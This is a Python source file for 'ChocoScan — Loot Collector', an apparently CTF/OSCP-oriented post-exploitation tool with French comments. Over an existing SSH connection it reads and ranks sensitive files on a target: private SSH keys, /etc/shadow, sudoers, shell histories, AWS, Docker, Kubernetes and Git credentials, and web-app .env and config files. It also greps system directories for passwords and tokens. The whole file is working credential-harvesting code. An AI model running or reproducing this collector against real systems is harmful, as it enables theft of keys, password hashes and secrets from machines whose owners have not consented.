"""
ChocoScan — Loot Collector.

Via une connexion SSH existante, cherche et liste automatiquement
les fichiers sensibles présents sur la cible :
  - Clés SSH privées
  - Historiques de commandes
  - Fichiers de configuration avec credentials
  - Tokens/secrets (AWS, Docker, Kubernetes...)
  - Fichiers web (wp-config, .env, database.yml...)
  - Shadow/passwd si lisibles

Développé par Kinder-Bueno (Mathys CASTELLA)
"""

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass
class LootItem:
    path:            str
    category:        str    # ssh_key | history | config | secret | web | system | interesting
    description:     str
    preview:         str    # Premiers 300 chars du contenu (filtré)
    is_critical:     bool = False
    size_bytes:      int  = 0


# ── Cibles de collecte ────────────────────────────────────────────────────────

LOOT_TARGETS: list[dict] = [
    # ── Clés SSH ──────────────────────────────────────────────────────────────
    {"path": "~/.ssh/id_rsa",       "cat": "ssh_key",  "desc": "Cle privee SSH RSA",      "critical": True},
    {"path": "~/.ssh/id_ecdsa",     "cat": "ssh_key",  "desc": "Cle privee SSH ECDSA",    "critical": True},
    {"path": "~/.ssh/id_ed25519",   "cat": "ssh_key",  "desc": "Cle privee SSH Ed25519",  "critical": True},
    {"path": "~/.ssh/id_dsa",       "cat": "ssh_key",  "desc": "Cle privee SSH DSA",      "critical": True},
    {"path": "~/.ssh/authorized_keys","cat":"ssh_key", "desc": "Cles autorisees SSH",      "critical": False},
    {"path": "~/.ssh/known_hosts",  "cat": "ssh_key",  "desc": "Hotes connus SSH",        "critical": False},
    {"path": "/root/.ssh/id_rsa",   "cat": "ssh_key",  "desc": "Cle privee SSH root",     "critical": True},

    # ── Historiques ───────────────────────────────────────────────────────────
    {"path": "~/.bash_history",     "cat": "history", "desc": "Historique bash",           "critical": False},
    {"path": "~/.zsh_history",      "cat": "history", "desc": "Historique zsh",            "critical": False},
    {"path": "~/.fish_history",     "cat": "history", "desc": "Historique fish",           "critical": False},
    {"path": "~/.mysql_history",    "cat": "history", "desc": "Historique MySQL",          "critical": False},
    {"path": "~/.python_history",   "cat": "history", "desc": "Historique Python REPL",   "critical": False},
    {"path": "~/.psql_history",     "cat": "history", "desc": "Historique PostgreSQL",    "critical": False},
    {"path": "/root/.bash_history", "cat": "history", "desc": "Historique bash root",      "critical": True},

    # ── Système ───────────────────────────────────────────────────────────────
    {"path": "/etc/passwd",         "cat": "system",  "desc": "Utilisateurs systeme",     "critical": False},
    {"path": "/etc/shadow",         "cat": "system",  "desc": "Hash mots de passe",       "critical": True},
    {"path": "/etc/crontab",        "cat": "system",  "desc": "Crons systeme",            "critical": False},
    {"path": "/var/spool/cron/crontabs/root", "cat":"system","desc":"Cron root",          "critical": True},
    {"path": "/etc/hosts",          "cat": "system",  "desc": "Hosts locaux (AD/interne)","critical": False},
    {"path": "/etc/sudoers",        "cat": "system",  "desc": "Configuration sudo",       "critical": True},
    {"path": "/proc/version",       "cat": "system",  "desc": "Version du kernel",        "critical": False},

    # ── Credentials / Secrets ────────────────────────────────────────────────
    {"path": "~/.aws/credentials",          "cat": "secret", "desc": "Credentials AWS",         "critical": True},
    {"path": "~/.aws/config",               "cat": "secret", "desc": "Config AWS",              "critical": False},
    {"path": "~/.docker/config.json",       "cat": "secret", "desc": "Token Docker Hub",        "critical": True},
    {"path": "~/.kube/config",              "cat": "secret", "desc": "Config kubectl (K8s)",    "critical": True},
    {"path": "~/.netrc",                    "cat": "secret", "desc": "Credentials FTP/HTTP",    "critical": True},
    {"path": "~/.gitconfig",                "cat": "secret", "desc": "Config Git (token ?)",    "critical": False},
    {"path": "~/.git-credentials",          "cat": "secret", "desc": "Credentials Git",         "critical": True},
    {"path": "~/.gnupg/",                   "cat": "secret", "desc": "Cles GPG",                "critical": False},
    {"path": "/etc/ssl/private/",           "cat": "secret", "desc": "Cles SSL privees",        "critical": True},

    # ── Fichiers web ──────────────────────────────────────────────────────────
    {"path": "/var/www/html/wp-config.php",         "cat": "web", "desc": "WordPress DB credentials",      "critical": True},
    {"path": "/var/www/html/.env",                  "cat": "web", "desc": ".env Laravel/Symfony",          "critical": True},
    {"path": "/var/www/html/config.php",            "cat": "web", "desc": "Config PHP (credentials ?)",   "critical": True},
    {"path": "/var/www/html/configuration.php",     "cat": "web", "desc": "Config Joomla",                 "critical": True},
    {"path": "/var/www/html/sites/default/settings.php","cat":"web","desc":"Config Drupal",                "critical": True},
    {"path": "/var/www/html/config/database.php",   "cat": "web", "desc": "Config BDD CodeIgniter",        "critical": True},
    {"path": "~/.env",                              "cat": "web", "desc": ".env (variables d'env)",         "critical": True},
    {"path": "/opt/app/.env",                       "cat": "web", "desc": ".env application",              "critical": True},
    {"path": "/var/www/html/config.yml",            "cat": "web", "desc": "Config YAML",                   "critical": False},
    {"path": "/etc/phpmyadmin/config.inc.php",      "cat": "web", "desc": "Config phpMyAdmin",             "critical": True},

    # ── Config applications ───────────────────────────────────────────────────
    {"path": "/etc/mysql/debian.cnf",               "cat": "config", "desc": "Credentials MySQL Debian",  "critical": True},
    {"path": "/var/lib/mysql/mysql/user.MYD",       "cat": "config", "desc": "Table users MySQL",         "critical": True},
    {"path": "/etc/postgresql/*/main/pg_hba.conf",  "cat": "config", "desc": "Config auth PostgreSQL",    "critical": False},
    {"path": "/etc/redis/redis.conf",               "cat": "config", "desc": "Config Redis (requirepass)","critical": False},
    {"path": "/opt/tomcat/conf/tomcat-users.xml",   "cat": "config", "desc": "Users Tomcat Manager",      "critical": True},
    {"path": "/opt/tomcat/*/conf/tomcat-users.xml", "cat": "config", "desc": "Users Tomcat Manager",      "critical": True},
    {"path": "/etc/mongod.conf",                    "cat": "config", "desc": "Config MongoDB",            "critical": False},
    {"path": "/home/*/.config/",                    "cat": "config", "desc": "Configs utilisateur",       "critical": False},

    # ── Flags CTF ─────────────────────────────────────────────────────────────
    {"path": "/root/root.txt",      "cat": "ctf",    "desc": "FLAG ROOT (HTB/CTF)",        "critical": True},
    {"path": "/home/*/user.txt",    "cat": "ctf",    "desc": "FLAG USER (HTB/CTF)",        "critical": True},
    {"path": "/root/proof.txt",     "cat": "ctf",    "desc": "FLAG PROOF (OSCP)",          "critical": True},
    {"path": "/home/*/proof.txt",   "cat": "ctf",    "desc": "FLAG PROOF (OSCP)",          "critical": True},
]


# ── Collecte SSH ──────────────────────────────────────────────────────────────

def _run(client, cmd: str, timeout: int = 15) -> str:
    try:
        stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
        return stdout.read().decode("utf-8", errors="replace").strip()
    except Exception:
        return ""


def _sanitize_preview(content: str, max_len: int = 300) -> str:
    """Tronque et nettoie l'aperçu du contenu."""
    content = content.strip()
    if len(content) > max_len:
        content = content[:max_len] + "..."
    return content


def collect_loot(client, host: str = "TARGET") -> list[LootItem]:
    """
    Collecte les fichiers sensibles sur la cible via SSH.
    Retourne une liste de LootItem triée par criticité.
    """
    findings: list[LootItem] = []

    for target in LOOT_TARGETS:
        path    = target["path"]
        cat     = target["cat"]
        desc    = target["desc"]
        critical= target["critical"]

        # Utilise un glob bash pour gérer les wildcards (*, ~)
        check_cmd = f"ls -la {path} 2>/dev/null | head -5"
        ls_out = _run(client, check_cmd)

        if not ls_out:
            continue

        # Essaie de lire le contenu (limite à 500 chars pour éviter les fichiers énormes)
        if path.endswith("/"):
            # Dossier : liste les fichiers
            preview = _run(client, f"ls {path} 2>/dev/null | head -20")
        elif path in ("/etc/shadow", "/etc/passwd"):
            preview = _run(client, f"cat {path} 2>/dev/null | head -20")
        elif cat == "ctf":
            # Pour les flags CTF, on lit tout le contenu
            preview = _run(client, f"cat {path} 2>/dev/null")
        else:
            # Limite la lecture aux 500 premiers caractères
            preview = _run(client, f"head -c 500 {path} 2>/dev/null")

        if not preview and not ls_out:
            continue

        # Taille du fichier
        size_out = _run(client, f"stat -c%s {path} 2>/dev/null")
        try:
            size = int(size_out)
        except (ValueError, TypeError):
            size = 0

        findings.append(LootItem(
            path=path,
            category=cat,
            description=desc,
            preview=_sanitize_preview(preview or ls_out),
            is_critical=critical,
            size_bytes=size,
        ))

    # Collecte supplémentaire : recherche de fichiers .env, .config, credentials dans /opt, /home
    extra_searches = [
        ("find /opt -name '*.conf' -o -name '*.env' -o -name '*.yml' 2>/dev/null | head -20",
         "Fichiers config dans /opt"),
        ("find /home -name '*.txt' -maxdepth 3 2>/dev/null | head -10",
         "Fichiers texte dans /home"),
        ("find / -name 'id_rsa' -not -path '*/proc/*' 2>/dev/null | head -10",
         "Toutes les cles SSH id_rsa"),
        ("grep -r 'password\\|passwd\\|secret\\|token\\|api_key' /etc /opt /var/www 2>/dev/null | grep -v '.pyc\\|.gz\\|Binary' | head -15",
         "Mots de passe en clair dans les configs"),
    ]

    for cmd, desc in extra_searches:
        result = _run(client, cmd, timeout=20)
        if result and result.strip():
            findings.append(LootItem(
                path="(recherche dynamique)",
                category="interesting",
                description=desc,
                preview=_sanitize_preview(result),
                is_critical=False,
            ))

    # Tri : CTF flags > clés SSH > secrets > critique > reste
    cat_order = {"ctf": 0, "ssh_key": 1, "secret": 2, "system": 3,
                 "config": 4, "web": 5, "history": 6, "interesting": 7}
    findings.sort(key=lambda x: (0 if x.is_critical else 1, cat_order.get(x.category, 9)))
    return findings
